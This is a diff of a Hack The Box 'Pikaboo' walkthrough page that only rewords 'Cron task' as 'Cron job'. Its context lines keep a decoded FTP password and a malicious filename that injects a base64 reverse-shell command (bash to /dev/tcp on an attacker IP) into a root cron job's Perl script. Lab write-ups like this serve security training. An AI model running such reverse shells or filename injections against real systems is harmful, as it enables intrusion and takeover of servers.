@@ -4,12 +4,12 @@
 <meta charset=utf-8>
 <meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
 <meta name=viewport content="width=device-width,minimum-scale=1">
-<meta name=description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a cron task that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
+<meta name=description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
 <meta name=robots content="index, follow">
 <meta name=image content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
 <meta name=author content="7Rocky">
 <meta property="og:title" content="Pikaboo">
-<meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a cron task that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
+<meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/en/htb/pikaboo/"><meta property="article:section" content="htb">
 <meta property="article:published_time" content="2021-12-04T00:00:00+01:00">
@@ -17,13 +17,13 @@
 <meta property="og:image" content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="Pikaboo">
-<meta itemprop=description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a cron task that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch"><meta itemprop=datePublished content="2021-12-04T00:00:00+01:00">
+<meta itemprop=description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch"><meta itemprop=datePublished content="2021-12-04T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-12-04T00:00:00+01:00">
 <meta itemprop=wordCount content="3174">
 <meta itemprop=keywords content="ftp,perl,ldap,cronjob,log-poisoning,lfi,command-injection,directory-path-traversal,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Pikaboo">
-<meta name=twitter:description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a cron task that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
+<meta name=twitter:description content="Hack The Box. Linux. Hard machine. This machine uses nginx and Apache web servers with a misconfiguration that derives in directory path traversal and afterwards in local file inclusion. There are credentials for FTP in LDAP and a Cron job that is vulnerable to command injection. Web enumeration, knowledge about nginx and LDAP, file inclusion techniques and command injection tricks are needed to compromise this machine. This write-up uses a custom Python script to compromise the entire machine from scratch">
 <meta name=twitter:image content="https://7rocky.github.io/images/HTB/Pikaboo/Pikaboo.png">
 <meta name=twitter:author content="7Rocky">
 <link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
@@ -120,7 +120,7 @@ $
 <a href=/en/tags/ldap class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">LDAP</a>
 </li>
 <li class=list>
-<a href=/en/tags/cronjob class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Cron tasks</a>
+<a href=/en/tags/cronjob class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Cron jobs</a>
 </li>
 <li class=list>
 <a href=/en/tags/log-poisoning class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Log Poisoning</a>
@@ -147,7 +147,7 @@ $
 <li><a href=#ftp-log-poisoning>FTP log poisoning</a></li>
 <li><a href=#system-enumeration>System enumeration</a></li>
 <li><a href=#ldap-enumeration>LDAP enumeration</a></li>
-<li><a href=#finding-a-cron-task>Finding a Cron task</a></li>
+<li><a href=#finding-a-cron-job>Finding a Cron job</a></li>
 <li><a href=#exploiting-a-command-injection>Exploiting a command injection</a></li>
 </ul>
 </nav>
@@ -556,7 +556,7 @@ result: 0 Success
 </code></pre></div><p>Now, we are able to connect via FTP as <code>pwnmeow</code> especifying the following password:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw<span style=color:#f92672>==</span> | base64 -d
 _G0tT4_C4tcH_&#39;3m_4lL!_
-</code></pre></div><h2 id=finding-a-cron-task>Finding a Cron task</h2>
+</code></pre></div><h2 id=finding-a-cron-job>Finding a Cron job</h2>
 <p>After that, we can check that <code>pwnmeow</code> is in the <code>ftp</code> group and list files that belong to this group:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ cat /etc/group | grep pwnmeow
 pwnmeow:x:1000:pwnmeow
@@ -602,7 +602,7 @@ www-data@pikaboo:/$ find / -group ftp 2&gt;/dev/null
 /opt/pokeapi/pokemon_v2/models.py
 /opt/pokeapi/pokemon_v2/tests.py
 /opt/pokeapi/pokemon_v2/api.py
-</code></pre></div><p>There is a file called <code>/usr/local/bin/django-admin.py</code>. In fact, inside this directory there is a Cron task:</p>
+</code></pre></div><p>There is a file called <code>/usr/local/bin/django-admin.py</code>. In fact, inside this directory there is a Cron job:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>www-data@pikaboo:/$ ls -l /usr/local/bin
 total 44
 drwxr-xr-x  2 root root 4096 Jul  6 18:57 __pycache__
@@ -624,7 +624,7 @@ www-data@pikaboo:/tmp$ cat /usr/local/bin/csvupdate_cron
   /usr/local/bin/csvupdate <span style=color:#66d9ef>$(</span>basename $d<span style=color:#66d9ef>)</span> *csv
   /usr/bin/rm -rf *
 <span style=color:#66d9ef>done</span>
-</code></pre></div><p>This Cron task is executing <code>csvupdate</code>, which is a Perl script:</p>
+</code></pre></div><p>This Cron job is executing <code>csvupdate</code>, which is a Perl script:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>root@pikaboo:/srv/ftp/abilities# cat /usr/local/bin/csvupdate
 </code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/perl</span>
 
@@ -743,7 +743,7 @@ ftp&gt; put
 200 PORT command successful. Consider using PASV.
 150 Ok to send data.
 226 Transfer complete.
-</code></pre></div><p>As shown, the malicious filename is crafted so that the command executed by the Cron task is:</p>
+</code></pre></div><p>As shown, the malicious filename is crafted so that the command executed by the Cron job is:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>/usr/local/bin/csvupdate $(basename $d) |echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv
 </code></pre></div><p>The use of the pipes (<code>|</code>) was the only way found to execute the command properly. Before, semicolons and OR statements were tried, but none of them worked.</p>
 <p>And the reason why this kind of command injection worked is because of some Perl weird behaviour (it is called: Perl open argument injection, more information <a href=https://perl-begin.org/topics/security/code-markup-injection/>here</a>).</p>
@@ -790,7 +790,7 @@ root@pikaboo:/srv/ftp/abilities#
 <li><a href=#ftp-log-poisoning>FTP log poisoning</a></li>
 <li><a href=#system-enumeration>System enumeration</a></li>
 <li><a href=#ldap-enumeration>LDAP enumeration</a></li>
-<li><a href=#finding-a-cron-task>Finding a Cron task</a></li>
+<li><a href=#finding-a-cron-job>Finding a Cron job</a></li>
 <li><a href=#exploiting-a-command-injection>Exploiting a command injection</a></li>
 </ul>
 </nav>
